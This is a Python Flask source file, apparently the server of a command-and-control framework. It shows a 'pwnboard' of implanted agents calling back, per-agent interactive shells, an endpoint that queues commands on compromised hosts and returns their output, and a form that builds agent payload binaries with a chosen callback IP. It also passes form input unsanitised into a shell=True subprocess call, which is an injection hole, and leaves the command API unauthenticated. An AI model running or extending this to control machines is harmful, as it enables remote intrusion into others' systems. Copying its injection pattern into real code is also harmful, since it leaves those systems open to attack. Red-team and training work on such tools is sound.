import subprocess
from datetime import datetime, timedelta
from functools import wraps

from flask import flash, redirect, render_template, request, session, url_for
from flask_wtf import FlaskForm
from werkzeug.security import check_password_hash, generate_password_hash
from wtforms import StringField
from wtforms.fields.simple import PasswordField

from c2 import app, db
from c2.models import Agent, Command, User


def login_required(f):
    """Requires a user to login before they can access critical endpoints

    :returns: redirects an unauthenticated user to /login
    :rtype: wrap
    """

    @wraps(f)
    def wrap(*args, **kwargs):
        if "logged_in" in session:
            return f(*args, **kwargs)
        else:
            flash("You need to login first.")
            return redirect(url_for("login"))

    return wrap


class AgentConfig(FlaskForm):
    callback_ip = StringField("Callback IP")
    sleep = StringField("Sleep Time")


class UserRegistration(FlaskForm):
    email = StringField("email")
    username = StringField("username")
    password = PasswordField("password")


class UserLogin:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def attempt_login(self):
        actual_user = User.query.filter(User.username == self.username).first()
        if not actual_user:
            return False
        elif not check_password_hash(actual_user.password, self.password):
            return False
        return True


def check_agents_statuses():
    """Function that checks if an agent is still alive
    using its sleepTime along with the last time it checked in

    """
    agents = db.session.query(Agent).all()
    for agent in agents:
        last_seen = agent.lastSeen
        last_seen = datetime.strptime(last_seen, "%d %B, %Y %H:%M:%S")
        curr_time = datetime.now()
        elapsed = curr_time - last_seen
        expected_check_in_time = timedelta(seconds=(agent.sleepTime * 2))
        if elapsed > expected_check_in_time:
            agent.isAlive = False
        else:
            agent.isAlive = True
        db.session.flush()
        db.session.commit()


def build_agent(ip: str = "127.0.0.1", sleepTime: str = "0") -> None:
    """Builds the binary using the user provided config values

    :param ip: The callback IP address, defaulted at localhost
    :type ip: str
    :param sleepTime: The amount of time the agent should wait to callback
    :type sleepTime: str
    :returns: none
    :rtype: None
    """
    subprocess.Popen([f"../agent/payloads/make.sh -h {ip} -s {sleepTime}"], shell=True)


@app.route("/config", methods=["GET", "POST"])
@login_required
def config():
    """Endpoint that contains a form allowing the user to provide values
    for a custom config and generate a new agent binary

    """
    form = AgentConfig()
    if request.method == "POST":
        args = [
            request.form[key] for key in request.form.keys() if request.form[key] != ""
        ]
        print(args)
        build_agent(*args)
        print("Payload Successfuly Generated!")
    return render_template("config.html", form=form)


@app.route("/agent<id>", methods=["GET"])
@login_required
def agent(id):
    """Endpoint that displays all the information regarding the
    agent with the specified ID, and includes an interactive shell.

    :param id: The ID of the agent
    :type id: str
    """
    selected_agent = Agent.query.filter_by(id=id).first()
    return render_template("agent.html", agent=selected_agent)


@app.route("/", methods=["GET"])
@login_required
def home():
    """Endpoint that displays a pwnboard that includes all of the
    active agents calling back to the server

    """
    check_agents_statuses()
    agents = db.session.query(Agent).all()
    return render_template("index.html", agents=agents)


@app.route("/api/1.1/add_command", methods=["POST"])
def add_command():
    """API endpoint that allows the agent terminal to add
    commands to the Command table in the database

    :returns: a json RPC object containing any finished jobs and the new job ID
    :rtype: dict
    """
    if request.method == "POST":
        json = request.json
        if json is None:
            return "Bad request"
        command = json["params"]
        agentID = json["method"].split("agent")[1]
        new_comm = Command(agentID=agentID, command=command)
        db.session.add(new_comm)
        db.session.flush()
        db.session.commit()
        db.session.refresh(new_comm)
        res = Command.query.filter(
            Command.agentID == agentID,
            Command.retrieved == True,
            Command.displayed == False,
        ).first()
        output = f"[+] new job started with id {new_comm.commandID}"
        if res is not None and res.output is not None:
            res.displayed = True
            output += f"\n[*] job with id {res.commandID} finished with output: \n{res.output}"
            db.session.flush()
            db.session.commit()
        rpc = {}
        rpc["result"] = output
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]
        return rpc


@app.route("/login", methods=["GET", "POST"])
def login():
    """Endpoint that allows a user to login and authenticate
    themselves with the server

    """
    error = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        user = UserLogin(username, password)
        if user.attempt_login():
            session["logged_in"] = True
            flash("You were just logged in!")
            return redirect(url_for("home"))
        else:
            error = "Invalid username or password"
    return render_template("login.html", error=error)


@app.route("/logout", methods=["GET"])
@login_required
def logout():
    """Endpoint that allows a user to logout of their session"""
    session.pop("logged_in", None)
    flash("You were just logged out!")
    return redirect(url_for("login.html"))


@app.route("/signup", methods=["GET", "POST"])
def signup():
    """Endpoint that allows a user to register an account"""
    form = UserRegistration()

    if request.method == "POST":
        email = request.form["email"]
        username = request.form["name"]
        password = request.form["password"]

        already_user = User.query.filter_by(email=email).first()

        if already_user:
            return f"{username} is already registered."

        new_user = User(
            email=email,
            name=username,
            password=generate_password_hash(password, method="sha256"),
        )

        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for("login"))

    return render_template("signup.html", form=form)


if __name__ == "__main__":
    """Runs the base flask app, only use for debugging,
    otherwise use the preferred method in README.md

    """
    app.run(host="0.0.0.0")
